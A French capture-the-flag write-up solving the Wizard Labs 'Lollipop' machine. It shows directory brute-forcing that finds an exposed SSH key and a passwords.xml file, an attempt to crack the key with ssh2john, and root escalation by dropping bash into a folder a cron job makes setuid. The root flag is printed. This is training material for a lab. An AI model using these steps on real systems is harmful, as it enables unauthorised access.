# Solution du CTF Lollipop de Wizard Labs

Lollipopshell
-------------

Pour arriver à la fin de ce CTF de *Wizard Labs* il aura fallut utiliser de bonnes wordlist et enumérer les fichiers et dossier sur le serveur web.  

Pour cela j'ai porté mon dévolu sur [les listes raft de fuzzdb](https://github.com/fuzzdb-project/fuzzdb/tree/master/discovery/predictable-filepaths/filename-dirname-bruteforce).  

On trouve ainsi un dossier caché *.ssh* avec la clé qui va avec :  

```plain
/index.html (Status: 200)
/mail.php (Status: 200)
/function.php (Status: 200)
/.ssh (Status: 301)
```

Et dans les scripts on découvre aussi un script *checker.php* qui demande à recevoir le résultat de 6\*6.  

Si on rentre un résultat non numérique on obtient une erreur 500 (page type d'Apache) avec un mail d'administration *mrl0llipop@localhost*.  

Je tiens à préciser que malgré tous mes efforts ce script ne semble pas vulnérable à la moindre injection.  

La clé SSH est malheureusement protégée par une passphrase. On est alors tenté d'utiliser l'utilitaire *ssh2john* pour tenter de la retrouver :  

```plain
$ /usr/share/john/ssh2john.py id_rsa 
id_rsa:$sshng$1$16$0AF431720D358A422BF9C1D77BDF72DF$1200$f5dce6fe7--- snip ---16ec902cb75a90ab0
```

Malheureusement cela n'aboutit nul part.  

En fouillant un peu plus on trouve le commentaire suivant en commentaire dans la page d'index :  

```html
<!--Todo : store passwords using a better way than xml files  -->
```

On bruteforce alors les extensions .xml et on trouve le fichier *passwords.xml* suivant :  

```html
<text><password>:3:!4]AFCH:3#D[%</password></text>
```

Tous ces éléments réunis nous permettent un accès SSH sur la machine en tant que *mrl0llipop*.  

En fouillant les binaires setuid du système je remarque un dossier où les binaires semblent *upgradés* (notez le *s* dans les permissions) à intervalle régulier :D   

```plain
mrl0llipop@Lollip0p:/suided_binaries$ ls -l
total 184
-rwxrwxrwx 1 root root  44304 Jan  6 09:26 mount
-rwxrwxrwx 1 root root 140944 Jan  6 09:25 sudo
mrl0llipop@Lollip0p:/suided_binaries$ ls -l
total 184
-rwsrwxrwx 1 root root  44304 Jan  6 09:26 mount
-rwsrwxrwx 1 root root 140944 Jan  6 09:25 sudo
```

Moi aussi je veux jouer, on va juste copier un *bash* dans ce dossier :  

```plain
mrl0llipop@Lollip0p:/suided_binaries$ ls -l
total 204
-rwsrwxrwx 1 root root  16664 Jan  8 02:20 devloop
-rwsrwxrwx 1 root root  44304 Jan  6 09:26 mount
-rwsrwxrwx 1 root root 140944 Jan  6 09:25 sudo
mrl0llipop@Lollip0p:/suided_binaries$ ./devloop
root@Lollip0p:/suided_binaries# cd /root
root@Lollip0p:/root# cat root.txt
030bd309b88360dc270d8760a212fb0b
root@Lollip0p:/root# crontab -l
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
* * * * * chown -R root.root /suided_binaries
* * * * * chmod -R 4777 /suided_binaries
```

Le plus dur aura été l'énumération :p

*Published November 17 2020 at 14:12*